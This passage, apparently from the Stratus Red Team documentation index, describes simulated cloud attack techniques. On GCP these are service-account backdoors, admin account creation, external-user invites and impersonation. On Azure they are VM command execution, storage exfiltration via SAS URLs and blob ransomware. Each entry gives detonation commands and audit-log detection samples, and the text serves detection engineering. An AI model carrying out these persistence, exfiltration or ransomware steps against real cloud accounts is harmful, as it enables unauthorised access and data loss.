<p>Info</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.persistence.backdoor-service-account-policy\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.backdoor-service-account-policy\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/#detection","title":"Detection","text":"<p>You can detect when the IAM policy of a service account is updated using the GCP Admin Audit Logs event <code>google.iam.admin.v1.SetIAMPolicy</code> (sample below, shortened for clarity).</p> <pre><code>{\n  \"protoPayload\": {\n    \"serviceName\": \"iam.googleapis.com\",\n    \"methodName\": \"google.iam.admin.v1.SetIAMPolicy\",\n    \"resourceName\": \"projects/-/serviceAccounts/123456789\",\n    \"serviceData\": {\n      \"@type\": \"type.googleapis.com/google.iam.v1.logging.AuditData\",\n      \"policyDelta\": {\n        \"bindingDeltas\": [\n          {\n            \"action\": \"ADD\",\n            \"role\": \"roles/iam.serviceAccountTokenCreator\",\n            \"member\": \"user:stratusredteam@gmail.com\"\n          }\n        ]\n      }\n    },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"email_id\": \"stratus-red-team-bip-sa@victim-project.iam.gserviceaccount.com\",\n      \"project_id\": \"victim-project\"\n    }\n  },\n  \"logName\": \"projects/victim-project/logs/cloudaudit.googleapis.com%2Factivity\",\n}\n</code></pre> <p>When someone impersonates a service account, the GCP Admin Audit Logs event <code>google.iam.credentials.v1.GenerateAccessToken</code> is emitted if you explicitly enabled <code>DATA_READ</code> events in the audit logs configuration of your project. For more information, see Impersonate GCP Service Accounts.</p>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/","title":"Create an Admin GCP Service Account","text":"<p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#description","title":"Description","text":"<p>Establishes persistence by creating a new service account and assigning it  <code>owner</code> permissions inside the current GCP project.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Create a service account</li> <li>Update the current GCP project's IAM policy to bind the service account to the <code>owner</code> role'</li> </ul> <p>References:</p> <ul> <li>https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.create-admin-service-account\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.create-admin-service-account/#detection","title":"Detection","text":"<p>Using the following GCP Admin Activity audit logs events:</p> <ul> <li><code>google.iam.admin.v1.CreateServiceAccount</code></li> <li><code>SetIamPolicy</code> with <code>resource.type=project</code></li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/","title":"Create a GCP Service Account Key","text":"<p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#description","title":"Description","text":"<p>Establishes persistence by creating a service account key on an existing service account.</p> <p>Warm-up:</p> <ul> <li>Create a service account</li> </ul> <p>Detonation:</p> <ul> <li>Create a new key for the service account</li> </ul> <p>References:</p> <ul> <li>https://expel.com/blog/incident-report-spotting-an-attacker-in-gcp/</li> <li>https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/</li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.create-service-account-key\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.create-service-account-key/#detection","title":"Detection","text":"<p>Using GCP Admin Activity audit logs event <code>google.iam.admin.v1.CreateServiceAccountKey</code>.</p>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/","title":"Invite an External User to a GCP Project","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#description","title":"Description","text":"<p>Persists in the GCP project by inviting an external (fictitious) user to the project. The attacker could then use the external user to access the project.</p> <p>Warm-up: None</p> <p>Detonation:</p> <ul> <li>Updates the project IAM policy to grant the attacker account the role <code>roles/editor</code></li> </ul> <p>Note</p> <p>Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default. This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:</p> <pre><code>export STRATUS_RED_TEAM_ATTACKER_EMAIL=\"your-own-gmail-account@gmail.com\"\nstratus detonate gcp.persistence.invite-external-user\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.persistence.invite-external-user\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.persistence.invite-external-user/#detection","title":"Detection","text":"<p>The Google Cloud Admin logs event <code>SetIamPolicy</code> is generated when a principal is granted non-owner permissions at the project level.</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"serviceName\": \"cloudresourcemanager.googleapis.com\",\n    \"methodName\": \"SetIamPolicy\",\n    \"serviceData\": {\n      \"@type\": \"type.googleapis.com/google.iam.v1.logging.AuditData\",\n      \"policyDelta\": {\n        \"bindingDeltas\": [\n          {\n            \"action\": \"ADD\",\n            \"role\": \"roles/editor\",\n            \"member\": \"user:stratusredteam@gmail.com\"\n          }\n        ]\n      }\n    },\n    \"request\": {\n      \"resource\": \"target-project\",\n      \"policy\": {\n        // ...\n      },\n      \"@type\": \"type.googleapis.com/google.iam.v1.SetIamPolicyRequest\"\n    }\n  }\n}\n</code></pre> <p>Although this attack technique does not simulate it, an attacker can also  use the GCP console to invite an external user as owner of a GCP project, which cannot be done through the SetIamPolicy API call. In that case, an <code>InsertProjectOwnershipInvite</code> event is generated:</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"serviceName\": \"cloudresourcemanager.googleapis.com\",\n    \"methodName\": \"InsertProjectOwnershipInvite\",\n    \"resourceName\": \"projects/target-project\",\n    \"request\": {\n      \"member\": \"user:attacker@gmail.com\",\n      \"projectId\": \"target-project\",\n      \"@type\": \"type.googleapis.com/google.internal.cloud.resourcemanager.InsertProjectOwnershipInviteRequest\"\n    },\n    \"response\": {\n      \"@type\": \"type.googleapis.com/google.internal.cloud.resourcemanager.InsertProjectOwnershipInviteResponse\"\n    }\n  }\n}\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/","title":"Impersonate GCP Service Accounts","text":"<p>idempotent </p> <p>Platform: GCP</p>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Privilege Escalation</li> </ul> </li> </ul>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#description","title":"Description","text":"<p>Attempts to impersonate several GCP service accounts. Service account impersonation in GCP allows to retrieve temporary credentials allowing to act as a service account.</p> <p>Warm-up:</p> <ul> <li>Create 10 GCP service accounts</li> <li>Grant the current user <code>roles/iam.serviceAccountTokenCreator</code> on one of these service accounts</li> </ul> <p>Detonation:</p> <ul> <li>Attempt to impersonate each of the service accounts</li> <li>One impersonation request will succeed, simulating a successful privilege escalation</li> </ul> <p>Info</p> <p>GCP takes a few seconds to propagate the new <code>roles/iam.serviceAccountTokenCreator</code> role binding to the current user.</p> <p>It is recommended to first warm up this attack technique (<code>stratus warmup ...</code>), wait for 30 seconds, then detonate it.</p> <p>References:</p> <ul> <li>https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/</li> <li>https://cloud.google.com/iam/docs/impersonating-service-accounts</li> </ul>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate gcp.privilege-escalation.impersonate-service-accounts\n</code></pre>"},{"location":"attack-techniques/GCP/gcp.privilege-escalation.impersonate-service-accounts/#detection","title":"Detection","text":"<p>Using GCP Admin Activity audit logs event <code>GenerateAccessToken</code>.  To get this event, you need to enable IAM audit logs for data access activity. More specifically, you need to enable <code>DATA_READ</code> for your GCP project, e.g. using Terraform:</p> <pre><code>data \"google_client_config\" \"current\" {}\n\nresource \"google_project_iam_audit_config\" \"audit\" {\n  project = data.google_client_config.current.project\n  service = \"allServices\"\n  audit_log_config {\n    log_type = \"DATA_READ\"\n  }\n}\n</code></pre> <p>Sample successful event (shortened for clarity):</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"authenticationInfo\": {\n      \"principalEmail\": \"user@domain.tld\",\n      \"principalSubject\": \"user:user@domain.tld\"\n    },\n    \"requestMetadata\": {\n      \"callerIp\": \"(calling IP)\",\n    },\n    \"serviceName\": \"iamcredentials.googleapis.com\",\n    \"methodName\": \"GenerateAccessToken\",\n    \"authorizationInfo\": [\n      {\n        \"permission\": \"iam.serviceAccounts.getAccessToken\",\n        \"granted\": true,\n        \"resourceAttributes\": {}\n      }\n    ],\n    \"request\": {\n      \"name\": \"projects/-/serviceAccounts/impersonated-service-account@project-id.iam.gserviceaccount.com\",\n      \"@type\": \"type.googleapis.com/google.iam.credentials.v1.GenerateAccessTokenRequest\"\n    }\n  },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"unique_id\": \"105711361070066902665\",\n      \"email_id\": \"impersonated-service-account@project-id.iam.gserviceaccount.com\",\n      \"project_id\": \"project-id\"\n    }\n  },\n  \"severity\": \"INFO\",\n  \"logName\": \"projects/project-id/logs/cloudaudit.googleapis.com%2Fdata_access\"\n}\n</code></pre> <p>When impersonation fails, the generated event does not contain the identity of the caller, as explained in the GCP documentation:</p> <p>Audit logging doesn't redact the caller's principal email address for any access that succeeds or for any write operation. For read-only operations that fail with a \"permission denied\" error, Audit Logging might redact the caller's principal  email address unless the caller is a service account.</p> <p>Sample unsuccessful event (shortened for clarity):</p> <pre><code>{\n  \"protoPayload\": {\n    \"@type\": \"type.googleapis.com/google.cloud.audit.AuditLog\",\n    \"status\": {\n      \"code\": 7,\n      \"message\": \"PERMISSION_DENIED\"\n    },\n    \"authenticationInfo\": {},\n    \"requestMetadata\": {\n      \"callerIp\": \"(calling IP)\"\n    },\n    \"serviceName\": \"iamcredentials.googleapis.com\",\n    \"methodName\": \"GenerateAccessToken\",\n    \"authorizationInfo\": [\n      {\n        \"permission\": \"iam.serviceAccounts.getAccessToken\",\n        \"resourceAttributes\": {}\n      }\n    ],\n    \"resourceName\": \"projects/-/serviceAccounts/103566171230474107362\",\n    \"request\": {\n      \"@type\": \"type.googleapis.com/google.iam.credentials.v1.GenerateAccessTokenRequest\",\n      \"name\": \"projects/-/serviceAccounts/target-service-account@project-id.iam.gserviceaccount.com\"\n    },\n    \"metadata\": {\n      \"identityDelegationChain\": [\n        \"projects/-/serviceAccounts/target-service-account@project-id.iam.gserviceaccount.com\"\n      ]\n    }\n  },\n  \"resource\": {\n    \"type\": \"service_account\",\n    \"labels\": {\n      \"email_id\": \"target-service-account@project-id.iam.gserviceaccount.com\",\n      \"project_id\": \"project-id\"\n    }\n  },\n  \"severity\": \"ERROR\",\n  \"logName\": \"projects/project-id/logs/cloudaudit.googleapis.com%2Fdata_access\"\n}\n</code></pre> <p>Some detection strategies may include:</p> <ul> <li>Alerting on unsuccessful impersonation attempts</li> <li>Alerting when the same IP address / user-agent attempts to impersonate several service accounts in a  short amount of time (successfully or not)</li> </ul>"},{"location":"attack-techniques/azure/","title":"Azure","text":"<p>This page contains the Stratus attack techniques for Azure, grouped by MITRE ATT&amp;CK Tactic. Note that some Stratus attack techniques may correspond to more than a single ATT&amp;CK Tactic.</p>"},{"location":"attack-techniques/azure/#execution","title":"Execution","text":"<ul> <li> <p>Execute Command on Virtual Machine using Custom Script Extension</p> </li> <li> <p>Execute Commands on Virtual Machine using Run Command</p> </li> </ul>"},{"location":"attack-techniques/azure/#persistence","title":"Persistence","text":"<ul> <li>Create Azure VM Bastion shareable link</li> </ul>"},{"location":"attack-techniques/azure/#exfiltration","title":"Exfiltration","text":"<ul> <li> <p>Export Disk Through SAS URL</p> </li> <li> <p>Exfiltrate Azure Storage via public access</p> </li> <li> <p>Exfiltrate Azure Storage through SAS URL</p> </li> </ul>"},{"location":"attack-techniques/azure/#impact","title":"Impact","text":"<ul> <li> <p>Azure Blob Storage ransomware through Encryption Scope using client-managed Key Vault key</p> </li> <li> <p>Azure ransomware via Storage Account Blob deletion</p> </li> <li> <p>Delete Azure resource lock</p> </li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/","title":"Execute Command on Virtual Machine using Custom Script Extension","text":"<p>slow </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Execution</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#description","title":"Description","text":"<p>By utilizing the 'CustomScriptExtension' extension on a Virtual Machine, an attacker can pass PowerShell commands to the VM as SYSTEM.</p> <p>References:</p> <ul> <li>https://docs.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows</li> <li>https://microsoft.github.io/Azure-Threat-Research-Matrix/Execution/AZT301/AZT301-2/</li> </ul> <p>Warm-up: </p> <ul> <li>Create a virtual machine</li> </ul> <p>Detonation: </p> <ul> <li>Configure a custom script extension for the virtual machine</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.execution.vm-custom-script-extension\n</code></pre>"},{"location":"attack-techniques/azure/azure.execution.vm-custom-script-extension/#detection","title":"Detection","text":"<p>Identify Azure events of type <code>Microsoft.Compute/virtualMachines/extensions/write</code>. Sample below (redacted for clarity).</p> <pre><code>{\n  \"duration\": 0,\n  \"resourceId\": \"/SUBSCRIPTIONS/&lt;your-subscription-id&gt;/RESOURCEGROUPS/RG-HAT6H48Q/PROVIDERS/MICROSOFT.COMPUTE/VIRTUALMACHINES/VM-HAT6H48Q/EXTENSIONS/CUSTOMSCRIPTEXTENSION-STRATUS-EXAMPLE\",\n  \"evt\": {\n    \"category\": \"Administrative\",\n    \"outcome\": \"Start\",\n    \"name\": \"MICROSOFT.COMPUTE/VIRTUALMACHINES/EXTENSIONS/WRITE\"\n  },\n  \"resource_name\": \"customscriptextension-stratus-example\",\n  \"time\": \"2022-06-18T19:57:27.8617215Z\",\n  \"properties\": {\n    \"hierarchy\": \"ecc2b97b-844b-414e-8123-b925dddf87ed/&lt;your-subscription-id&gt;\",\n    \"message\": \"Microsoft.Compute/virtualMachines/extensions/write\",\n    \"eventCategory\": \"Administrative\",\n    \"entity\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-hat6h48q/providers/Microsoft.Compute/virtualMachines/vm-hat6h48q/extensions/CustomScriptExtension-Stratus-Example\"\n  },\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/","title":"Execute Commands on Virtual Machine using Run Command","text":"<p>slow idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Execution</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#description","title":"Description","text":"<p>By utilizing the 'RunCommand' feature on a Virtual Machine, an attacker can pass:</p> <ul> <li>Windows: PowerShell commands to the VM as SYSTEM.</li> <li>Linux: Shell commands to the VM as root.</li> </ul> <p>References:</p> <ul> <li>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command</li> <li>https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command</li> <li>https://microsoft.github.io/Azure-Threat-Research-Matrix/Execution/AZT301/AZT301-1/</li> <li>https://go.crowdstrike.com/rs/281-OBQ-266/images/report-crowdstrike-2023-threat-hunting-report.pdf (page 34)</li> <li>https://cloud.google.com/blog/topics/threat-intelligence/russian-targeting-gov-business</li> </ul> <p>Warm-up: </p> <ul> <li>Create a virtual machine</li> </ul> <p>Detonation: </p> <ul> <li>Invoke a RunCommand on the target virtual machine</li> </ul>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.execution.vm-run-command\n</code></pre>"},{"location":"attack-techniques/azure/azure.execution.vm-run-command/#detection","title":"Detection","text":"<p>Identify <code>Microsoft.Compute/virtualMachines/runCommand/action</code>  and <code>Microsoft.Compute/virtualMachines/runCommands/write</code> events in Azure Activity logs.</p> <p>Sample event (redacted for clarity):</p> <pre><code>{\n    \"caller\": \"you@domain.tld\",\n    \"eventTimestamp\": \"2022-06-01T11:39:35.6986539Z\",\n    \"id\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-4x3tj2hb/providers/Microsoft.Compute/virtualMachines/vm-4x3tj2hb/events/25235036-3b0c-46e7-97d0-5bea476a6ab8/ticks/637896803756986539\",\n    \"level\": \"Informational\",\n    \"operationName\": {\n        \"value\": \"Microsoft.Compute/virtualMachines/runCommand/action\",\n        \"localizedValue\": \"Run Command on Virtual Machine\"\n    },\n    \"resourceGroupName\": \"rg-4x3tj2hb\",\n    \"resourceProviderName\": {\n        \"value\": \"Microsoft.Compute\",\n        \"localizedValue\": \"Microsoft.Compute\"\n    },\n    \"resourceType\": {\n        \"value\": \"Microsoft.Compute/virtualMachines\",\n        \"localizedValue\": \"Microsoft.Compute/virtualMachines\"\n    },\n    \"resourceId\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-4x3tj2hb/providers/Microsoft.Compute/virtualMachines/vm-4x3tj2hb\",\n    \"status\": {\n        \"value\": \"Succeeded\",\n        \"localizedValue\": \"Succeeded\"\n    },\n    \"properties\": {\n        \"eventCategory\": \"Administrative\",\n        \"entity\": \"/subscriptions/&lt;your-subscription-id&gt;/resourceGroups/rg-4x3tj2hb/providers/Microsoft.Compute/virtualMachines/vm-4x3tj2hb\",\n        \"message\": \"Microsoft.Compute/virtualMachines/runCommand/action\",\n        \"hierarchy\": \"&lt;your-tenant-id&gt;/&lt;your-subscription-id&gt;\"\n    },\n    \"relatedEvents\": []\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/","title":"Export Disk Through SAS URL","text":"<p>idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#description","title":"Description","text":"<p>Generate a public Shared Access Signature (SAS) URL to download an Azure disk.</p> <p>Warm-up:</p> <ul> <li>Create an Azure-managed disk</li> </ul> <p>Detonation:</p> <ul> <li>Generated a Shared Access Signature (SAS) URL for the disk</li> </ul> <p>References:</p> <ul> <li>https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurevmdisk</li> <li>https://zigmax.net/azure-disk-data-exfiltration/</li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.exfiltration.disk-export\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.disk-export/#detection","title":"Detection","text":"<p>Identify <code>Microsoft.Compute/disks/beginGetAccess/action</code> events in Azure Activity logs.</p> <p>Sample event (redacted for clarity):</p> <pre><code>{\n  \"resourceId\": \"/SUBSCRIPTIONS/&lt;your-subscription-id&gt;/RESOURCEGROUPS/RG-IKFFQ01Z/PROVIDERS/MICROSOFT.COMPUTE/DISKS/STRATUS-RED-TEAM-DISK\",\n  \"evt\": {\n    \"category\": \"Administrative\",\n    \"outcome\": \"Success\",\n    \"name\": \"MICROSOFT.COMPUTE/DISKS/BEGINGETACCESS/ACTION\"\n  },\n  \"level\": \"Information\",\n  \"properties\": {\n    \"hierarchy\": \"ecc2b97b-844b-414e-8123-b925dddf87ed/2fd72d85-b49f-4e19-b567-4a8cb7301e8b\",\n    \"message\": \"Microsoft.Compute/disks/beginGetAccess/action\",\n    \"eventCategory\": \"Administrative\",\n    \"entity\": \"/subscriptions/&lt;your-subscription-id/resourceGroups/rg-ikffq01z/providers/Microsoft.Compute/disks/stratus-red-team-disk\"\n  }\n}\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-public-access/","title":"Exfiltrate Azure Storage via public access","text":"<p>idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-public-access/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-public-access/#description","title":"Description","text":"<p>Modify storage policies to download content in an Azure storage account.</p> <p>Warm-up:</p> <ul> <li>Create a storage account with anonymous blob access disabled</li> <li>Create a storage container with an empty test file</li> </ul> <p>Detonation:</p> <ul> <li>Enable anonymous blob access on the storage account</li> <li>Change storage container access level to allow public access (anonymous access to containers and blobs)</li> <li>Download test file from the public container</li> </ul> <p>References:</p> <ul> <li>https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/</li> <li>https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure</li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-public-access/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.exfiltration.storage-public-access\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-public-access/#detection","title":"Detection","text":"<p>Monitor Azure Activity Logs for storage account property changes, specifically <code>Microsoft.Storage/storageAccounts/write</code> operations that modify storage access policies.</p> <p>Sample Azure Activity Log event to monitor:</p> <pre><code>    \"operationName\": {\n        \"value\": \"Microsoft.Storage/storageAccounts/write\",\n        \"localizedValue\": \"Create/Update Storage Account\"\n    },\n    \"properties\": {\n        \"requestbody\": \"{\\\"properties\\\":{\\\"allowBlobPublicAccess\\\":true}}\",\n        \"eventCategory\": \"Administrative\",\n        \"entity\": \"/subscriptions/[SUBSCRIPTION-ID]/resourceGroups/stratus-red-team-storage-storage-6m6k/providers/Microsoft.Storage/storageAccounts/stratusredteamstorage\",\n        \"message\": \"Microsoft.Storage/storageAccounts/write\",\n        \"hierarchy\": \"[REMOVED]\"\n    }\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-sas-export/","title":"Exfiltrate Azure Storage through SAS URL","text":"<p>idempotent </p> <p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-sas-export/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Exfiltration</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-sas-export/#description","title":"Description","text":"<p>Generate a Shared Access Signature (SAS) to download content in an Azure storage account.</p> <p>Warm-up:</p> <ul> <li>Create a storage account with anonymous blob access disabled</li> <li>Create a storage container with an empty test file</li> </ul> <p>Detonation:</p> <ul> <li>Generate a shared access signature (SAS) URL for the storage container</li> <li>Download test file from the container using SAS URL</li> </ul> <p>References:</p> <ul> <li>https://www.microsoft.com/en-us/security/blog/2025/08/27/storm-0501s-evolving-techniques-lead-to-cloud-based-ransomware/</li> <li>https://microsoft.github.io/Azure-Threat-Research-Matrix/Impact/AZT701/AZT701-2/</li> </ul>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-sas-export/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.exfiltration.storage-sas-export\n</code></pre>"},{"location":"attack-techniques/azure/azure.exfiltration.storage-sas-export/#detection","title":"Detection","text":"<p>Monitor Azure Activity Logs for storage account property changes, specifically <code>Microsoft.Storage/storageAccounts/listKeys/action</code> operations. Once an attacker has accessed storage keys, they are able to generate a SAS URL for any storage the key has access to.</p> <p>Sample Azure Activity Log event to monitor:</p> <pre><code>    \"operationName\": {\n        \"value\": \"Microsoft.Storage/storageAccounts/listKeys/action\",\n        \"localizedValue\": \"List Storage Account Keys\"\n    },\n    \"properties\": {\n        \"eventCategory\": \"Administrative\",\n        \"entity\": \"/subscriptions/[SUBSCRIPTION-ID]/resourceGroups/stratus-red-team-storage-storage-27n4/providers/Microsoft.Storage/storageAccounts/stratusredteamexport\",\n        \"message\": \"Microsoft.Storage/storageAccounts/listKeys/action\",\n        \"hierarchy\": \"[REMOVED]\"\n    }\n</code></pre>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-client-encryption-scope/","title":"Azure Blob Storage ransomware through Encryption Scope using client-managed Key Vault key","text":"<p>Platform: Azure</p>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-client-encryption-scope/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Impact</li> </ul> </li> </ul>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-client-encryption-scope/#description","title":"Description","text":"<p>Simulates Azure Blob Storage ransomware activity that encrypts files using an encryption scope backed by a customer-managed Key Vault key, then deletes the key to render the data inaccessible. Note that due to Azure's purge protection feature, it is impossible to hard-delete the key and the blobs remain recoverable.</p> <p>You will need to have the <code>Key Vault Administrator</code> role on your Azure subscription to correctly warmup the technique.</p> <p>Warm-up:</p> <ul> <li>Create an Azure Storage Account with a system-assigned managed identity</li> <li>Create an Azure Key Vault without purge protection</li> <li>Grant the storage account the \"Key Vault Crypto Service Encryption User\" role on the Key Vault</li> <li>Create multiple storage containers in the account</li> </ul> <p>Detonation:</p> <ul> <li>Create a number of blobs in the containers with random content and file extensions</li> <li>Enable purge protection on the Key Vault (to generate MICROSOFT.KEYVAULT/VAULTS/WRITE activity log event)</li> <li>Create an RSA 2048 key in the Key Vault</li> <li>Create an encryption scope on the storage account using the Key Vault key</li> <li>Download all blobs and re-upload them using the new encryption scope</li> <li>Soft-delete the Key Vault key</li> <li>Attempt to purge the key (fails due to purge protection, but logged)</li> </ul> <p>References:</p> <ul> <li>Storm-0501\u2019s evolving techniques lead to cloud-based ransomware</li> </ul>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-client-encryption-scope/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate azure.impact.blob-ransomware-client-encryption-scope\n</code></pre>"},{"location":"attack-techniques/azure/azure.impact.blob-ransomware-client-encryption-scope/#detection","title":"Detection","text":"<p>You can detect this ransomware activity by monitoring for:</p> <ol> <li>Encryption scope creation  (<code>MICROSOFT.STORAGE/STORAGEACCOUNTS/ENCRYPTIONSCOPES/WRITE</code>) followed by the deletion of the key (<code>KeyDelete</code>) used for encryption.</li> <li>High volumes of <code>GetBlob</code> followed by <code>PutBlob</code> operations.</li> </ol> <p>Sample Azure Activity log event for Key Vault creation:</p> <pre><code>{\n  \"operationName\": \"MICROSOFT.KEYVAULT/VAULTS/WRITE\",\n  \"category\": \"Administrative\",\n  \"resultType\": \"Success\",\n  \"properties\": {\n    \"entity\": \"/subscriptions/&lt;subscription-id&gt;/resourceGroups/&lt;rg&gt;/providers/Microsoft.KeyVault/vaults/&lt;vault-name&gt;\"\n  }\n}\n</code></pre> <p>Sample Azure Activity log event for Key Vault key deletion:</p> <pre><code>{\n  \"operationName\": \"KeyDelete\",\n  \"category\": \"AuditEvent\",\n  \"resultType\": \"Success\",\n  \"properties\": {\n    \"entity\": \"/subscriptions/&lt;subscription-id&gt;/resourceGroups/&lt;rg&gt;/providers/Microsoft.KeyVault/vaults/&lt;vault-name&gt;/keys/&lt;key-name&gt;\"\n  }\n}\n</code></pre> <p>Sample event for encryption scope creation:</p> <pre><code>{\n  \"operationName\": \"MICROSOFT.STORAGE/STORAGEACCOUNTS/ENCRYPTIONSCOPES/WRITE\",\n  \"category\": \"Administrative\",\n  \"resultType\": \"Success\",\n  \"properties\": {\n    \"entity\": \"/subscriptions/&lt;subscription-id&gt;/resourceGroups/&lt;rg&gt;/providers/Microsoft.Storage/storageAccounts/&lt;storage-account-name&gt;/encryptionScopes/&lt;encryption-scope-name&gt;\"\n  